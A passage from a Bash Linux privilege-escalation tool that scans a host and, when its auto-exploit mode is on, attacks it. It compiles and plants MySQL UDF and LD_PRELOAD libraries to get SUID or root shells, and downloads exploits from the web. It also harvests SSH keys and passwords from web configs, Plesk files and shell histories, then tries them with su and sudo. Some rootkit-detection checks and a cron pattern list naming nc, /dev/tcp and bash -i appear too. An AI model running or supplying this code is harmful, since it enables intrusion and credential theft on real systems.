  ps aux 2>/dev/null | grep "^root" | grep -v "\[" | while IFS= read -r line; do
    local proc=$(echo "$line" | awk '{for(i=11;i<=NF;i++) printf $i" "; print ""}')
    verbose "Root process: $proc"
    # Check for exploitable services
    case "$proc" in
      *mysql*|*mariadbd*)
        warning "MySQL running as root - check for UDF exploit"
        ;;
      *apache*|*httpd*|*nginx*)
        info "Web server as root: $proc"
        ;;
      *docker*)
        info "Docker daemon running as root"
        ;;
    esac
  done
  
  if [ "$VERBOSE" = true ]; then
    verbose "Network interfaces:"
    ip addr 2>/dev/null | grep -E "^[0-9]+:|inet " | while IFS= read -r l; do
      verbose "  $l"
    done
    verbose "Routing table:"
    ip route 2>/dev/null | while IFS= read -r l; do
      verbose "  $l"
    done
    verbose "ARP cache:"
    ip neigh 2>/dev/null | while IFS= read -r l; do
      verbose "  $l"
    done
    verbose "DNS configuration:"
    cat /etc/resolv.conf 2>/dev/null | grep -v "^#" | while IFS= read -r l; do
      verbose "  $l"
    done
    verbose "Iptables rules:"
    iptables -L -n 2>/dev/null | head -20 | while IFS= read -r l; do
      verbose "  $l"
    done
  fi
  
  # Internal network services accessible
  subheader "Internal services"
  for port in 3306 5432 6379 27017 11211 9200 8080 8443 2375 2376; do
    (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null && warning "Internal service on port $port"
  done
  
  # Check for MySQL running as root
  if command_exists mysql; then
    if mysql -u root -e "SELECT 1" 2>/dev/null | grep -q 1; then
      found_vector "MySQL root access without password"
      if [ "$AUTO_EXPLOIT" = true ]; then
        info "Attempting MySQL UDF privilege escalation..."
        exploit_mysql_udf
      fi
    fi
  fi
}

exploit_mysql_udf() {
  info "Attempting MySQL UDF exploit for root shell..."
  
  local plugin_dir=$(mysql -u root -N -e "SHOW VARIABLES LIKE 'plugin_dir'" 2>/dev/null | awk '{print $2}')
  if [ -n "$plugin_dir" ]; then
    info "MySQL plugin directory: $plugin_dir"
    # Download raptor_udf2
    local udf_src="$EXPLOIT_DIR/raptor_udf2.c"
    download_file "https://www.exploit-db.com/download/1518" "$udf_src"
    if [ -f "$udf_src" ]; then
      gcc -g -c "$udf_src" -o "$EXPLOIT_DIR/raptor_udf2.o" -fPIC 2>/dev/null
      gcc -g -shared -Wl,-soname,raptor_udf2.so -o "$EXPLOIT_DIR/raptor_udf2.so" "$EXPLOIT_DIR/raptor_udf2.o" -lc 2>/dev/null
      if [ -f "$EXPLOIT_DIR/raptor_udf2.so" ]; then
        mysql -u root -e "USE mysql; CREATE TABLE foo(line blob); INSERT INTO foo VALUES(LOAD_FILE('$EXPLOIT_DIR/raptor_udf2.so')); SELECT * FROM foo INTO DUMPFILE '$plugin_dir/raptor_udf2.so'; CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so'; SELECT do_system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');" 2>/dev/null
        if verify_suid_root /tmp/rootbash; then
          success "MySQL UDF exploit succeeded!"
          /tmp/rootbash -p 2>/dev/null
        fi
      fi
    fi
  fi
}

# ============================================================================
# 11. LD_PRELOAD / LD_LIBRARY_PATH
# ============================================================================
check_ld_preload() {
  header "LD_PRELOAD / LD_LIBRARY_PATH"
  
  # Check if sudo preserves LD_PRELOAD
  if sudo -n -l 2>/dev/null | grep -q "env_keep.*LD_PRELOAD"; then
    found_vector "Sudo preserves LD_PRELOAD"
    if [ "$AUTO_EXPLOIT" = true ]; then
      exploit_attempt "LD_PRELOAD injection via sudo"
      local src="$EXPLOIT_DIR/preload.c"
      local so="$EXPLOIT_DIR/preload.so"
      
      cat > "$src" << 'PRELOAD_EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
PRELOAD_EOF
      
      gcc -fPIC -shared -nostartfiles -o "$so" "$src" 2>/dev/null
      if [ -f "$so" ]; then
        local sudo_cmd=$(sudo -n -l 2>/dev/null | grep "NOPASSWD" | tail -1 | awk '{print $NF}')
        if [ -n "$sudo_cmd" ]; then
          success "Exploiting LD_PRELOAD with: $sudo_cmd"
          sudo -n LD_PRELOAD="$so" "$sudo_cmd" 2>/dev/null
          check_root_shell && return
        fi
      fi
    fi
  fi
  
  # Check if sudo preserves LD_LIBRARY_PATH
  if sudo -n -l 2>/dev/null | grep -q "env_keep.*LD_LIBRARY_PATH"; then
    found_vector "Sudo preserves LD_LIBRARY_PATH!"
  fi
  
  # Check for RPATH / RUNPATH in SUID binaries
  subheader "RPATH/RUNPATH in SUID binaries"
  if command_exists readelf; then
    timeout 10 find / -perm -4000 -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" -not -path "/nix/*" -not -path "/snap/*" -not -path "/run/*" 2>/dev/null | head -20 | while IFS= read -r bin; do
      local rpath=$(readelf -d "$bin" 2>/dev/null | grep -E "RPATH|RUNPATH")
      if [ -n "$rpath" ]; then
        warning "SUID binary with RPATH: $bin"
        echo "  $rpath"
        local rdir=$(echo "$rpath" | grep -oP '\[.*?\]' | tr -d '[]')
        if [ -w "$rdir" ] 2>/dev/null; then
          found_vector "Writable RPATH directory for SUID binary: $bin -> $rdir"
        fi
      fi
    done
  fi
}

# ============================================================================
# 12. PATH HIJACKING
# ============================================================================
check_path_hijack() {
  header "PATH HIJACKING"
  
  # Check for writable directories in PATH
  echo "$PATH" | tr ':' '\n' | while IFS= read -r dir; do
    if [ -w "$dir" ] && [ "$dir" != "." ]; then
      warning "Writable directory in PATH: $dir"
    fi
    if [ "$dir" = "." ] || [ "$dir" = "" ]; then
      found_vector "Current directory (.) in PATH - path hijacking possible"
    fi
  done
  
  # Check SUID binaries for relative path calls
  subheader "SUID binaries with relative paths"
  timeout 10 find / -perm -4000 -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" -not -path "/nix/*" -not -path "/snap/*" -not -path "/run/*" 2>/dev/null | head -30 | while IFS= read -r bin; do
    if command_exists strings; then
      local rel_paths=$(strings "$bin" 2>/dev/null | grep -E "^[a-zA-Z_][a-zA-Z0-9_]*$" | head -5)
      if [ -n "$rel_paths" ]; then
        local binname=$(basename "$bin")
        for cmd in $rel_paths; do
          if command_exists "$cmd" && ! echo "$cmd" | grep -q "/"; then
            # Check if this could be a command call
            if echo "$cmd" | grep -qE "^(service|mail|cat|ls|date|id|whoami|hostname|uname|ifconfig|ip|ps|netstat)$"; then
              found_vector "SUID binary $bin may call '$cmd' via relative path"
              success "Hijack: export PATH=/tmp:\$PATH; echo '/bin/bash -p' > /tmp/$cmd; chmod +x /tmp/$cmd; $bin"
            fi
          fi
        done
      fi
    fi
  done
}

# ============================================================================
# 13. MISCELLANEOUS CHECKS
# ============================================================================
check_misc() {
  header "MISCELLANEOUS CHECKS"
  
  # Disk group membership
  subheader "Disk group"
  if id -nG 2>/dev/null | grep -qw disk; then
    found_vector "User is in disk group (raw disk access)"
    success "Try: debugfs /dev/sda"
  fi
  
  # Video group
  if id -nG 2>/dev/null | grep -qw video; then
    warning "User is in video group (can read framebuffer)"
  fi
  
  # adm group
  if id -nG 2>/dev/null | grep -qw adm; then
    warning "User is in adm group (can read logs)"
  fi
  
  # lxd group
  if id -nG 2>/dev/null | grep -qw lxd; then
    found_vector "User is in lxd group"
    success "Exploit: lxc init ubuntu:16.04 test -c security.privileged=true; lxc config device add test whatever disk source=/ path=/mnt/root recursive=true; lxc start test; lxc exec test /bin/bash"
  fi
  
  # Check for setuid core dumps
  subheader "Core dumps"
  if [ -r /proc/sys/fs/suid_dumpable ]; then
    local dumpable=$(cat /proc/sys/fs/suid_dumpable)
    if [ "$dumpable" != "0" ]; then
      warning "SUID core dumps enabled (suid_dumpable=$dumpable)"
    fi
  fi
  
  # World-writable files owned by root
  subheader "World-writable root files"
  timeout 10 find / -writable -user root -type f \
    -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" \
    -not -path "/tmp/*" -not -path "/var/tmp/*" \
    -not -path "/nix/*" -not -path "/snap/*" 2>/dev/null | head -20 | while IFS= read -r f; do
    warning "World-writable root file: $f"
  done
  
  # MOTD scripts
  subheader "MOTD scripts"
  if [ -d /etc/update-motd.d/ ]; then
    for f in /etc/update-motd.d/*; do
      if [ -w "$f" ]; then
        found_vector "Writable MOTD script: $f (runs on login)"
      fi
    done
  fi
  
  # Check for screen sessions
  subheader "Screen/tmux sessions"
  if command_exists screen; then
    local screens=$(screen -ls 2>/dev/null | grep -v "^$" | grep -v "No Sockets")
    if [ -n "$screens" ]; then
      info "Screen sessions: $screens"
    fi
  fi
  
  if command_exists tmux; then
    local tmuxs=$(tmux ls 2>/dev/null)
    if [ -n "$tmuxs" ]; then
      info "Tmux sessions: $tmuxs"
    fi
  fi
  
  # Snap package manager
  subheader "Snap"
  if command_exists snap; then
    local snap_version=$(snap version 2>/dev/null | head -1)
    info "Snap: $snap_version"
    # CVE-2019-7304 dirty_sock
    if snap version 2>/dev/null | grep -q "snapd.*2\.[0-2][0-9]\." 2>/dev/null; then
      found_vector "Snap potentially vulnerable to dirty_sock (CVE-2019-7304)"
    fi
  fi
  
  # Backdoor / rootkit detection
  subheader "Backdoor / rootkit indicators"
  
  local suspicious_procs=""
  ps auxwww 2>/dev/null | while IFS= read -r pline; do
    local pname=$(echo "$pline" | awk '{print $11}')
    local puser=$(echo "$pline" | awk '{print $1}')
    local ppid=$(echo "$pline" | awk '{print $2}')
    
    if echo "$pname" | grep -qE '^\[.*\]$'; then
      local real_exe=""
      real_exe=$(readlink "/proc/$ppid/exe" 2>/dev/null)
      if [ -n "$real_exe" ] && ! echo "$real_exe" | grep -q "^\["; then
        if ! echo "$real_exe" | grep -qE "^/(usr/)?(sbin|bin|lib)/(kthread|ksoftirq|migration|watchdog)"; then
          warning "SUSPICIOUS: Process masquerading as kernel thread"
          warning "  PID=$ppid User=$puser Appears=[${pname}] Real=$real_exe"
          found_vector "Suspicious process masquerading as kernel thread: PID $ppid ($real_exe)"
        fi
      fi
    fi
    
    if echo "$pline" | grep -qE '(\.hidden|/\.[a-z].*/(\.r|\.s|\.x|payload|shell|backdoor|reverse|miner|xmrig|cryptonight))'; then
      warning "SUSPICIOUS: Hidden/backdoor process: $pline"
      found_vector "Suspicious hidden process: PID $ppid ($pname)"
    fi
  done
  
  for hidden_dir in /tmp/.* /dev/shm/.* /var/tmp/.* /run/.*; do
    if [ -d "$hidden_dir" ] 2>/dev/null && [ "$hidden_dir" != "/tmp/.." ] && [ "$hidden_dir" != "/tmp/." ] && \
       [ "$hidden_dir" != "/dev/shm/.." ] && [ "$hidden_dir" != "/dev/shm/." ] && \
       [ "$hidden_dir" != "/var/tmp/.." ] && [ "$hidden_dir" != "/var/tmp/." ] && \
       [ "$hidden_dir" != "/run/.." ] && [ "$hidden_dir" != "/run/." ]; then
      local dir_base=$(basename "$hidden_dir")
      case "$dir_base" in
        .ICE-unix|.X11-unix|.font-unix|.XIM-unix|.Test-unix|.snapshots|.cache|.config) ;;
        .b*) ;; # our own temp dir
        *)
          if find "$hidden_dir" -maxdepth 2 -type f -executable 2>/dev/null | head -1 | grep -q .; then
            warning "Hidden directory with executables: $hidden_dir"
            ls -la "$hidden_dir" 2>/dev/null | head -5
            found_vector "Hidden directory with executables in tmp: $hidden_dir"
          fi
          ;;
      esac
    fi
  done
  
  if [ -r /etc/ld.so.preload ] && [ -s /etc/ld.so.preload ]; then
    warning "SUSPICIOUS: /etc/ld.so.preload exists and is non-empty (possible rootkit)"
    cat /etc/ld.so.preload 2>/dev/null
    found_vector "Non-empty /etc/ld.so.preload (possible rootkit/preload hijack)"
  fi
  
  for cronfile in /etc/crontab /etc/cron.d/* /var/spool/cron/* /var/spool/cron/crontabs/*; do
    if [ -r "$cronfile" ] 2>/dev/null; then
      if grep -qE '(curl|wget|python|perl|ruby|php|nc |ncat|bash -i|/dev/tcp/|base64 -d|b64decode)' "$cronfile" 2>/dev/null; then
        local susp_lines
        susp_lines=$(grep -nE '(curl|wget|python|perl|ruby|php|nc |ncat|bash -i|/dev/tcp/|base64 -d|b64decode)' "$cronfile" 2>/dev/null | grep -v "^#" | head -5)
        if [ -n "$susp_lines" ]; then
          warning "SUSPICIOUS commands in cron: $cronfile"
          echo "$susp_lines"
        fi
      fi
    fi
  done
  
  # Python library hijacking
  subheader "Python library hijacking"
  if command_exists python3 || command_exists python; then
    local pybin=$(command -v python3 || command -v python)
    local pypath=$($pybin -c "import sys; print(':'.join(sys.path))" 2>/dev/null)
    echo "$pypath" | tr ':' '\n' | while IFS= read -r pdir; do
      if [ -n "$pdir" ] && [ -d "$pdir" ] && [ -w "$pdir" ]; then
        warning "Writable Python path: $pdir"
      fi
    done
  fi
  
  # Writable /tmp with sticky bit
  subheader "Temp directories"
  if [ -w /tmp ] && [ -w /dev/shm ]; then
    info "/tmp and /dev/shm are writable (as expected)"
  fi
}

# ============================================================================
# 14. AUTOMATED EXPLOIT DOWNLOAD & EXECUTION
# ============================================================================
auto_download_exploits() {
  header "AUTOMATED EXPLOIT DOWNLOAD"
  
  if [ "$SCAN_ONLY" = true ]; then
    info "Scan-only mode, skipping exploit download"
    return
  fi
  
  local kernel_version="$SYS_KERNEL"
  local kernel_short=$(echo "$kernel_version" | cut -d- -f1)
  
  info "Searching for kernel exploits for ${W}$kernel_short${RST}..."
  
  # Linux Exploit Suggester
  subheader "Linux Exploit Suggester"
  local les="$EXPLOIT_DIR/les.sh"
  download_file "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh" "$les"
  if [ ! -f "$les" ]; then
    download_file "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" "$les"
  fi
  if [ ! -f "$les" ]; then
    download_file "https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl" "$EXPLOIT_DIR/les2.pl"
    if [ -f "$EXPLOIT_DIR/les2.pl" ] && command_exists perl; then
      info "Using linux-exploit-suggester-2 (Perl)..."
      perl "$EXPLOIT_DIR/les2.pl" 2>/dev/null | while IFS= read -r line; do
        if echo "$line" | grep -qi "high\|positive"; then
          warning "$line"
        else
          info "$line"
        fi
      done
    fi
  fi
  if [ -f "$les" ]; then
    chmod +x "$les"
    info "Running Linux Exploit Suggester..."
    bash "$les" --kernel "$kernel_version" 2>/dev/null | grep -E "\[CVE|Exposure:" | while IFS= read -r line; do
      if echo "$line" | grep -q "highly probable"; then
        warning "$line"
      else
        info "$line"
      fi
    done
  fi
}

# ============================================================================
# 15. POST-SCAN EXPLOITATION (credential reuse, SSH pivoting, etc.)
# ============================================================================
post_scan_exploit() {
  header "POST-SCAN EXPLOITATION"
  
  if [ "$SCAN_ONLY" = true ]; then return; fi
  
  # ---- 1. SSH key pivoting ----
  subheader "SSH key pivoting"
  if command_exists ssh; then
    local keylist="$TMPDIR/.keylist"
    timeout 10 find / -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" \
      -not -path "/nix/*" -not -path "/snap/*" -not -path "/run/*" \
      \( -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "id_dsa" \) \
      -readable 2>/dev/null > "$keylist" 2>/dev/null
    
    while IFS= read -r keyfile; do
      [ -z "$keyfile" ] && continue
      if [ -r "$keyfile" ] && head -1 "$keyfile" 2>/dev/null | grep -q "PRIVATE"; then
        info "Trying SSH key: $keyfile"
        
        cp "$keyfile" "$TMPDIR/.sshkey" 2>/dev/null
        chmod 600 "$TMPDIR/.sshkey" 2>/dev/null
        
        for target_user in root $(awk -F: '$3>=1000 && $3<65000{print $1}' /etc/passwd 2>/dev/null); do
          local ssh_out
          ssh_out=$(timeout 5 ssh -o StrictHostKeyChecking=no -o BatchMode=yes \
            -o ConnectTimeout=3 -i "$TMPDIR/.sshkey" \
            "$target_user@127.0.0.1" "id" 2>/dev/null)
          if echo "$ssh_out" | grep -q "uid=0"; then
            exploit_attempt "SSH key $keyfile -> $target_user@localhost"
            exploit_success "SSH key login as root via $keyfile"
            success "Root shell: ssh -i $keyfile $target_user@127.0.0.1"
            GOT_ROOT=true
            rm -f "$TMPDIR/.sshkey" 2>/dev/null
            return
          elif [ -n "$ssh_out" ]; then
            exploit_attempt "SSH key $keyfile -> $target_user@localhost"
            success "SSH key works for $target_user (not root, but lateral movement)"
            info "  $ssh_out"
          fi
        done
        rm -f "$TMPDIR/.sshkey" 2>/dev/null
      fi
    done < "$keylist"
  fi
  
  # ---- 2. Credential reuse (passwords from configs -> su/sudo) ----
  subheader "Credential reuse"
  local cred_file="$TMPDIR/.found_creds"
  local dbcred_file="$TMPDIR/.found_dbcreds"
  : > "$cred_file"
  : > "$dbcred_file"
  
  local config_patterns=""
  for pattern in \
    "/var/www/html/wp-config.php" \
    "/var/www/*/wp-config.php" \
    "/var/www/vhosts/*/httpdocs/wp-config.php" \
    "/var/www/vhosts/*/httpdocs/*/wp-config.php" \
    "/var/www/vhosts/*/httpdocs/app/config/parameters.php" \
    "/var/www/vhosts/*/httpdocs/app/config/parameters.yml" \
    "/var/www/vhosts/*/httpdocs/config/settings.inc.php" \
    "/var/www/vhosts/*/httpdocs/*/config/settings.inc.php" \
    "/var/www/vhosts/*/httpdocs/.env" \
    "/var/www/vhosts/*/.env" \
    "/var/www/vhosts/*/httpdocs/config.php" \
    "/var/www/vhosts/*/httpdocs/configuration.php" \
    "/var/www/vhosts/*/httpdocs/sites/default/settings.php" \
    "/var/www/html/configuration.php" "/var/www/html/config.php" \
    "/var/www/html/.env" "/var/www/*/.env" \
    "/opt/*/.env" "/srv/*/.env" "/home/*/.env" "/home/*/.my.cnf" \
    "/etc/mysql/debian.cnf" "/etc/mysql/my.cnf" \
    "/etc/psa/.psa.shadow" \
    "/etc/psa/private/secret_key" \
    "/usr/local/psa/admin/conf/panel.ini" \
    "/var/www/vhosts/*/conf/*.conf"; do
    for f in $pattern; do
      if [ -r "$f" ] 2>/dev/null; then
        grep -hiEo "(password|passwd|pass|db_password|DB_PASSWORD|database_password|DB_PASS|MYSQL_PASSWORD|MYSQL_ROOT_PASSWORD)['\"]?\s*[=:>]\s*['\"]?[^'\"<,; ]{3,}['\"]?" "$f" 2>/dev/null | \
          grep -oE "['\"][^'\"]{3,}['\"]$" | tr -d "'\"\`" >> "$cred_file" 2>/dev/null
        grep -hiEo "define\s*\(\s*'DB_PASSWORD'\s*,\s*'[^']*'" "$f" 2>/dev/null | sed "s/.*'\\([^']*\\)'$/\\1/" >> "$cred_file" 2>/dev/null
        grep -hiE "database_password" "$f" 2>/dev/null | sed -n "s/.*[=:] *['\"]\\{0,1\\}\([^'\" ][^'\"]*\\).*/\\1/p" >> "$cred_file" 2>/dev/null
        
        local db_u="" db_p=""
        db_u=$(grep -hiEo "define\s*\(\s*'DB_USER'\s*,\s*\"[^\"]*\"" "$f" 2>/dev/null | head -1 | sed 's/.*"\([^"]*\)".*/\1/')
        if [ -z "$db_u" ]; then
          db_u=$(grep -hiEo "define\s*\(\s*'DB_USER'\s*,\s*'[^']*'" "$f" 2>/dev/null | head -1 | sed "s/.*'\\([^']*\\)'$/\\1/")
        fi
        db_p=$(grep -hiEo "define\s*\(\s*'DB_PASSWORD'\s*,\s*\"[^\"]*\"" "$f" 2>/dev/null | head -1 | sed 's/.*"\([^"]*\)".*/\1/')
        if [ -z "$db_p" ]; then
          db_p=$(grep -hiEo "define\s*\(\s*'DB_PASSWORD'\s*,\s*'[^']*'" "$f" 2>/dev/null | head -1 | sed "s/.*'\\([^']*\\)'$/\\1/")
        fi
        if [ -z "$db_u" ]; then
          db_u=$(grep -hiE "'database_user'" "$f" 2>/dev/null | head -1 | sed -n "s/.*[=:>] *['\"]\\{0,1\\}\([^'\" ,][^'\"]*\\).*/\\1/p")
        fi
        if [ -z "$db_p" ]; then
          db_p=$(grep -hiE "'database_password'" "$f" 2>/dev/null | head -1 | sed -n "s/.*[=:>] *['\"]\\{0,1\\}\([^'\" ,][^'\"]*\\).*/\\1/p")
        fi
        if [ -z "$db_u" ]; then
          db_u=$(grep -hiE "^DB_USER(NAME)?=" "$f" 2>/dev/null | head -1 | awk -F= '{print $2}' | tr -d "'\"\`" )
        fi
        if [ -z "$db_p" ]; then
          db_p=$(grep -hiE "^DB_PASSWORD=" "$f" 2>/dev/null | head -1 | awk -F= '{print $2}' | tr -d "'\"\`" )
        fi
        if [ -n "$db_u" ] && [ -n "$db_p" ]; then
          echo "$db_u:$db_p" >> "$dbcred_file" 2>/dev/null
        fi
      fi
    done
  done
  
  if [ -r /etc/psa/.psa.shadow ] 2>/dev/null; then
    info "Found Plesk admin password file"
    local psa_pass
    psa_pass=$(cat /etc/psa/.psa.shadow 2>/dev/null | tr -d '\n')
    echo "$psa_pass" >> "$cred_file" 2>/dev/null
    echo "admin:$psa_pass" >> "$dbcred_file" 2>/dev/null
  fi
  
  if [ -r /etc/mysql/debian.cnf ]; then
    local deb_u deb_p
    deb_u=$(grep -m1 "^user" /etc/mysql/debian.cnf 2>/dev/null | awk -F= '{print $2}' | tr -d ' ')
    deb_p=$(grep -m1 "^password" /etc/mysql/debian.cnf 2>/dev/null | awk -F= '{print $2}' | tr -d ' ')
    echo "$deb_p" >> "$cred_file"
    [ -n "$deb_u" ] && [ -n "$deb_p" ] && echo "$deb_u:$deb_p" >> "$dbcred_file" 2>/dev/null
  fi
  
  for my_cnf in /root/.my.cnf /home/*/.my.cnf; do
    if [ -r "$my_cnf" ] 2>/dev/null; then
      grep -i "password" "$my_cnf" 2>/dev/null | awk -F= '{print $2}' | tr -d ' "'"'"'' >> "$cred_file"
    fi
  done
  
  timeout 5 find /var/www/vhosts/ /home/ /var/www/ /opt/ /srv/ \
    -maxdepth 4 -name ".env" -readable -type f 2>/dev/null | head -20 | while IFS= read -r envf; do
    grep -hiE "^(DB_PASSWORD|DATABASE_PASSWORD|MYSQL_PASSWORD|APP_KEY|SECRET|PASSWORD)=" "$envf" 2>/dev/null | \
      awk -F= '{print $2}' | tr -d "'\"\`" >> "$cred_file"
  done
  
  for cronscript in $(grep -rhE '^\s*\*|^\s*[0-9]' /etc/crontab /etc/cron.d/* 2>/dev/null | \
    awk '{for(i=7;i<=NF;i++) printf $i" "; print ""}' | \
    grep -oE '/[^ ]*\.(sh|py|pl|rb)' | sort -u | head -20); do
    if [ -r "$cronscript" ] 2>/dev/null; then
      grep -hEo "\-p'[^']*'" "$cronscript" 2>/dev/null | sed "s/-p'//;s/'$//" >> "$cred_file"
      grep -hEo '\-p"[^"]*"' "$cronscript" 2>/dev/null | sed 's/-p"//;s/"$//' >> "$cred_file"
      grep -hEo '\-p[^ ]*' "$cronscript" 2>/dev/null | sed 's/-p//' | grep -v '^\$\|^`\|^$' >> "$cred_file"
      grep -hEo "(password|passwd|pass|pwd)\s*=\s*['\"][^'\"]*['\"]" "$cronscript" 2>/dev/null | \
        grep -oE "['\"][^'\"]+['\"]$" | tr -d "'\"\`" >> "$cred_file"
      local cron_u cron_p
      cron_u=$(grep -hEo '\-u[^ ]*' "$cronscript" 2>/dev/null | head -1 | sed 's/-u//')
      cron_p=$(grep -hEo '\-p[^ ]*' "$cronscript" 2>/dev/null | head -1 | sed 's/-p//')
      if [ -n "$cron_u" ] && [ -n "$cron_p" ] && ! echo "$cron_p" | grep -qE '^\$|^`'; then
        echo "$cron_u:$cron_p" >> "$dbcred_file" 2>/dev/null
      fi
    fi
  done
  
  cat /root/.mysql_history /home/*/.mysql_history 2>/dev/null | \
    grep -iE "password|identified" | grep -oE "'[^']+'" | tr -d "'" | head -5 >> "$cred_file"
  
  cat /root/.bash_history /home/*/.bash_history 2>/dev/null | \
    grep -E "mysql.*-p" | sed -n 's/.*-p\([^ ]*\).*/\1/p' | head -5 >> "$cred_file"
  
  cat /root/.bash_history /home/*/.bash_history 2>/dev/null | \
    grep -iE "^(su |passwd |echo.*passwd|sshpass)" | head -5 >> "$TMPDIR/.hist_hints" 2>/dev/null
  
  sort -u "$cred_file" -o "$cred_file" 2>/dev/null
  sed -i '/^$/d' "$cred_file" 2>/dev/null
  sort -u "$dbcred_file" -o "$dbcred_file" 2>/dev/null
  sed -i '/^$/d' "$dbcred_file" 2>/dev/null
  
  local cred_count=$(wc -l < "$cred_file" 2>/dev/null | tr -d ' ')
  if [ "$cred_count" -gt 0 ] 2>/dev/null; then
    info "Found $cred_count unique password(s) to try"
    exploit_attempt "Credential reuse: su root with $cred_count password(s)"
    
    while IFS= read -r pass; do
      [ -z "$pass" ] && continue
      [ ${#pass} -lt 3 ] && continue
      
      local su_result
      su_result=$(echo "$pass" | timeout 3 su -c "id" root 2>/dev/null)
      if echo "$su_result" | grep -q "uid=0"; then
        exploit_success "su root with password from config files"
        success "Root password found! Password: $pass"
        echo "$pass" | su -c "/bin/bash" root 2>/dev/null
        GOT_ROOT=true
        return
      fi
      
      for sysuser in $(awk -F: '$3>=1000 && $3<65000 && $1!="'"$SYS_USER"'"{print $1}' /etc/passwd 2>/dev/null | head -5); do
        local su2_result
        su2_result=$(echo "$pass" | timeout 3 su -c "id" "$sysuser" 2>/dev/null)
        if [ -n "$su2_result" ]; then
          success "Password '$pass' works for user '$sysuser'"
          local sudo_check
          sudo_check=$(echo "$pass" | timeout 3 su -c "echo '$pass' | sudo -S id" "$sysuser" 2>/dev/null)
          if echo "$sudo_check" | grep -q "uid=0"; then
            exploit_success "Credential reuse: $sysuser -> sudo root"
            success "Root via: su $sysuser, then sudo -S with same password"
            GOT_ROOT=true
            return
          fi
        fi
      done
    done < "$cred_file"
    exploit_failed "Credential reuse (no passwords worked for root)"
  else
    info "No extractable passwords found in config files"
  fi
  
  # ---- 3. MySQL UDF privilege escalation ----
  subheader "MySQL UDF exploitation"
  if command_exists mysql; then
    local udf_done=false
    
    echo "root:" >> "$dbcred_file" 2>/dev/null
    
    sort -u "$dbcred_file" -o "$dbcred_file" 2>/dev/null
    sed -i '/^$/d' "$dbcred_file" 2>/dev/null
    
    while IFS= read -r dbcred_line; do
      [ -z "$dbcred_line" ] && continue
      [ "$udf_done" = true ] && break
      local mysql_user="${dbcred_line%%:*}"
      local mysql_pass="${dbcred_line#*:}"
      [ -z "$mysql_user" ] && continue
      
      local mysql_test
      mysql_test=$(timeout 5 mysql -u"$mysql_user" -p"$mysql_pass" -e "SELECT 1" 2>/dev/null)
      if [ -z "$mysql_test" ] && [ -z "$mysql_pass" ]; then
        mysql_test=$(timeout 5 mysql -u"$mysql_user" -e "SELECT 1" 2>/dev/null)
      fi
      [ -z "$mysql_test" ] && continue
      
      info "MySQL login successful as $mysql_user"
      
      local has_file_priv
      has_file_priv=$(timeout 5 mysql -u"$mysql_user" ${mysql_pass:+-p"$mysql_pass"} -e "SHOW GRANTS" -sN 2>/dev/null)
      if ! echo "$has_file_priv" | grep -qiE "ALL PRIVILEGES ON \*\.\*|FILE|SUPER"; then
        info "User $mysql_user lacks FILE/SUPER privilege, skipping UDF"
        continue
      fi
      
      local plugin_dir
      plugin_dir=$(timeout 5 mysql -u"$mysql_user" ${mysql_pass:+-p"$mysql_pass"} -e "SELECT @@plugin_dir" -sN 2>/dev/null)
      
      if [ -n "$plugin_dir" ] && [ -w "$plugin_dir" ] 2>/dev/null; then
        exploit_attempt "MySQL UDF ($mysql_user) -> root shell"
        info "Plugin dir writable: $plugin_dir"
        
        if command_exists gcc; then
          local udf_src="$TMPDIR/udf.c"
          cat > "$udf_src" << 'UDF_EOF'
#include <stdio.h>
#include <stdlib.h>
typedef struct st_udf_args { unsigned int arg_count; } UDF_ARGS;
typedef struct st_udf_init { } UDF_INIT;
char do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    system(args->arg_count > 0 ? (char*)args->arg_count : "id");
    return 0;
}
UDF_EOF
          gcc -shared -fPIC -o "$TMPDIR/udf.so" "$udf_src" 2>/dev/null
          if [ -f "$TMPDIR/udf.so" ]; then
            cp "$TMPDIR/udf.so" "$plugin_dir/udf.so" 2>/dev/null
            timeout 5 mysql -u"$mysql_user" ${mysql_pass:+-p"$mysql_pass"} -e \
              "CREATE FUNCTION do_system RETURNS INTEGER SONAME 'udf.so';" 2>/dev/null
            timeout 5 mysql -u"$mysql_user" ${mysql_pass:+-p"$mysql_pass"} -e \
              "SELECT do_system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');" 2>/dev/null
            if verify_suid_root /tmp/rootbash; then
              exploit_success "MySQL UDF -> SUID bash"
              success "Run: /tmp/rootbash -p"
              /tmp/rootbash -p 2>/dev/null
              check_root_shell && { GOT_ROOT=true; return; }
            fi
            timeout 5 mysql -u"$mysql_user" ${mysql_pass:+-p"$mysql_pass"} -e "DROP FUNCTION IF EXISTS do_system;" 2>/dev/null
            rm -f "$plugin_dir/udf.so" 2>/dev/null
          fi
          exploit_failed "MySQL UDF ($mysql_user)"
        fi
      else
        info "MySQL plugin dir not writable for $mysql_user ($plugin_dir)"
      fi
      
      if echo "$has_file_priv" | grep -qiE "ALL PRIVILEGES ON \*\.\*|SUPER|CREATE USER|GRANT"; then
        info "User $mysql_user has elevated privileges"
        local mysql_into_file
        mysql_into_file=$(timeout 5 mysql -u"$mysql_user" ${mysql_pass:+-p"$mysql_pass"} -e \
          "SELECT 'test' INTO OUTFILE '/tmp/.mysql_test_bump'" 2>&1)
        if [ -f /tmp/.mysql_test_bump ]; then
          rm -f /tmp/.mysql_test_bump 2>/dev/null
          info "MySQL can write files (INTO OUTFILE works)"
          
          if [ -w /var/spool/cron/ ] || [ -w /var/spool/cron/crontabs/ ] || [ -w /etc/cron.d/ ]; then
            exploit_attempt "MySQL INTO OUTFILE -> cron root shell ($mysql_user)"
            local cron_target="/etc/cron.d/bump_escalate"
            if [ -w /etc/cron.d/ ]; then
